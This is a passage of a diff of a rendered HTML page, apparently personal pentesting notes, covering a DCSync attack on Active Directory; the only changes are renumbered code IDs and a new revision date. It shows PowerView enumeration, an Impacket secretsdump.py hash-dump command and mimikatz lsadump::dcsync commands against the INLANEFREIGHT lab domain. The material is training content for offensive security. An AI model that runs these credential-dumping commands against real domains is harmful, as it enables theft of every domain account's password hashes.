-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="p">*</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">useraccountcontrol</span> <span class="o">-like</span> <span class="s1">&#39;*ENCRYPTED_TEXT_PWD_ALLOWED*&#39;</span><span class="p">}</span> <span class="p">|</span><span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">useraccountcontrol</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="p">*</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">useraccountcontrol</span> <span class="o">-like</span> <span class="s1">&#39;*ENCRYPTED_TEXT_PWD_ALLOWED*&#39;</span><span class="p">}</span> <span class="p">|</span><span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">useraccountcontrol</span>
 </span></code></pre></div></td></tr></table></div>
 <p>To decrypt it we can use Impacket’s secretsdump.py:</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span>
-<span class="normal"><a href="#__codelineno-23-2">2</a></span>
-<span class="normal"><a href="#__codelineno-23-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a>secretsdump.py<span class="w"> </span>-outputfile<span class="w"> </span><span class="nv">$filename</span><span class="w"> </span>-just-dc<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$userSamAccountName</span>@<span class="nv">$ipDomainController</span>
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2"></a><span class="c1"># As an example:</span>
-</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3"></a><span class="c1"># secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 </span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span>
+<span class="normal"><a href="#__codelineno-26-2">2</a></span>
+<span class="normal"><a href="#__codelineno-26-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a>secretsdump.py<span class="w"> </span>-outputfile<span class="w"> </span><span class="nv">$filename</span><span class="w"> </span>-just-dc<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$userSamAccountName</span>@<span class="nv">$ipDomainController</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2"></a><span class="c1"># As an example:</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3"></a><span class="c1"># secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 </span>
 </span></code></pre></div></td></tr></table></div>
 <h3 id="mimikatz">Mimikatz</h3>
 <h4 id="way-1">Way #1</h4>
 <p>Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize <code>runas.exe</code> to accomplish this:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span>
-<span class="normal"><a href="#__codelineno-24-2">2</a></span>
-<span class="normal"><a href="#__codelineno-24-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a>runas /netonly /user:$domain\$userSamAccountName powershell
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2"></a># Example:
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3"></a># runas /netonly /user:INLANEFREIGHT\adunn powershell
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span>
+<span class="normal"><a href="#__codelineno-27-2">2</a></span>
+<span class="normal"><a href="#__codelineno-27-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a>runas /netonly /user:$domain\$userSamAccountName powershell
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2"></a># Example:
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3"></a># runas /netonly /user:INLANEFREIGHT\adunn powershell
 </span></code></pre></div></td></tr></table></div>
 <p>And now, from powershell:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span>
-<span class="normal"><a href="#__codelineno-25-2">2</a></span>
-<span class="normal"><a href="#__codelineno-25-3">3</a></span>
-<span class="normal"><a href="#__codelineno-25-4">4</a></span>
-<span class="normal"><a href="#__codelineno-25-5">5</a></span>
-<span class="normal"><a href="#__codelineno-25-6">6</a></span>
-<span class="normal"><a href="#__codelineno-25-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2"></a>
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3"></a><span class="c">#########</span>
-</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4"></a><span class="c"># mimikatz command</span>
-</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5"></a><span class="c">########</span>
-</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6"></a>
-</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">INLANEFREIGHT</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">INLANEFREIGHT</span><span class="p">\</span><span class="n">administrator</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1">1</a></span>
+<span class="normal"><a href="#__codelineno-28-2">2</a></span>
+<span class="normal"><a href="#__codelineno-28-3">3</a></span>
+<span class="normal"><a href="#__codelineno-28-4">4</a></span>
+<span class="normal"><a href="#__codelineno-28-5">5</a></span>
+<span class="normal"><a href="#__codelineno-28-6">6</a></span>
+<span class="normal"><a href="#__codelineno-28-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2"></a>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3"></a><span class="c">#########</span>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4"></a><span class="c"># mimikatz command</span>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5"></a><span class="c">########</span>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6"></a>
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">INLANEFREIGHT</span><span class="p">.</span><span class="n">LOCAL</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">INLANEFREIGHT</span><span class="p">\</span><span class="n">administrator</span>
 </span></code></pre></div></td></tr></table></div>
 <h4 id="way-2">Way #2</h4>
 <p>If we have access to the host with an user who has DCSync privileges (DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege) on the domain, we can run from powershell the attack in one line:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span>
-<span class="normal"><a href="#__codelineno-26-2">2</a></span>
-<span class="normal"><a href="#__codelineno-26-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a><span class="c"># From my Evil-WinRm Connection:</span>
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="s2">&quot;lsadump::dcsync</span>
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3"></a><span class="s2">/domain:$domain /user:Administrator&quot;</span> <span class="n">exit</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span>
+<span class="normal"><a href="#__codelineno-29-2">2</a></span>
+<span class="normal"><a href="#__codelineno-29-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a><span class="c"># From my Evil-WinRm Connection:</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="s2">&quot;lsadump::dcsync</span>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3"></a><span class="s2">/domain:$domain /user:Administrator&quot;</span> <span class="n">exit</span>
 </span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 7, 2026 21:02:17 UTC"><span class="timeago" datetime="2026-03-07T21:02:17+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 7, 2026 21:02:17 UTC">2026-03-07</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="March 30, 2026 20:15:40 UTC"><span class="timeago" datetime="2026-03-30T20:15:40+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="March 30, 2026 20:15:40 UTC">2026-03-30</span></small></br>
 
 
     <small>Created: January 18, 2025 19:59:20</small>
